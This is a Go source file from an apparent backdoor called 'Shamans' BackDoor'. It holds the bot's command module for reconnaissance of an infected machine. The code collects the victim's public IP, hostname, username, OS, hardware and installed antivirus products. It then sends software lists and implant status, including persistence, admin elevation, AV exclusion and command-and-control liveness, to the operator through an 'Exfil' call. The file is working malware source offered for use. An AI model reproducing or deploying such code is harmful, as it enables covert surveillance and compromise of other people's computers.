package commands

import (
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"os"
	"os/user"
	"runtime"
	"strings"
	"time"

	"github.com/whiterabb17/shaman/package/api"
	"github.com/whiterabb17/shaman/package/install"
	"github.com/whiterabb17/shaman/package/util"
)

const (
	fmtInfo = "BOT: <b>%s</b>\n\n <i>IPAddress</i>:\t %s\n <i>Computername</i>:\t %s\n <i>Username</i>:\t [<b>%s</b>] %s\n <i>Operating System</i>:\t %s %s\n " +
		"<i>CPU</i>:\t %s\n <i>GPU</i>:\t %s\n <i>Memory</i>:\t %s\n <i>AV</i>:\t %s\n"
	softInfo = "```\nInstalled Software:\n    %s```"
	fmtInst  = "**Shamans' BackDoor** \n <i>Version</i>:\t %s\n <i>Identity</i>:\t %s\n <i>IIFLoaded</i>:\t %v\n <i>Base</i>:\t %s\n <i>Install Date</i>:\t %s\n <i>Persistence</i>:\t %d\n <i>Elevated</i>:\t %v\n <i>Excluded</i>:\t %v\n <i>C1 Alive</i>:\t %v\n <i>C3 Alive</i>:\t %v"
)

func InitInfo() string {
	if util.Dbg {
		log.Println("[+] Gathering System Info.")
	}
	resp, err := http.Get(util.IPProvider)
	util.Handle(err)
	defer resp.Body.Close()

	ipb, err := ioutil.ReadAll(resp.Body)
	util.Handle(err)
	ip := strings.TrimSpace(string(ipb))

	host, _ := os.Hostname()
	usr, _ := user.Current()

	avs := strings.Replace(util.AntiInfo(), "\n", "\n    ", -1)

	cfg := fmt.Sprintf(fmtInfo,
		util.ID, ip, host, usr.Name, usr.Username,
		runtime.GOOS, runtime.GOARCH, util.CPUInfo(),
		util.GPUInfo(), util.MemoryInfo(), avs,
	)
	return cfg
}

// Info
func Info() string {
	if util.Dbg {
		log.Println("[+] Gathering System Info.")
	}
	resp, err := http.Get(util.IPProvider)
	util.Handle(err)
	defer resp.Body.Close()

	ipb, err := ioutil.ReadAll(resp.Body)
	util.Handle(err)
	ip := strings.TrimSpace(string(ipb))

	host, _ := os.Hostname()
	usr, _ := user.Current()

	avs := strings.Replace(util.AntiInfo(), "\n", "\n    ", -1)

	cfg := fmt.Sprintf(fmtInfo,
		util.ID, ip, host, usr.Name, usr.Username,
		runtime.GOOS, runtime.GOARCH, util.CPUInfo(),
		util.GPUInfo(), util.MemoryInfo(), avs,
	)
	return cfg
}

// Software
func Software() {
	api.Exfil("[*] Checking for installed Software, please wait.")
	soft := util.SoftwareInfo()
	if soft != "" {
		api.Exfil(soft)
	} else {
		api.Exfil("[!] Do not have the required registry access")
	}
}

// InstanceInfo
func InstanceInfo() {
	instStr := fmt.Sprintf(fmtInst,
		util.Version,
		util.ID,
		install.Info.Loaded,
		install.Info.Base,
		strings.Replace(install.Info.Date.Format(time.RFC3339), "T", " ", 1),
		install.Info.PType,
		util.RunningAsAdmin(),
		install.Info.Exclusion,
		util.C1,
		util.C3,
	)
	api.Exfil(instStr)
}
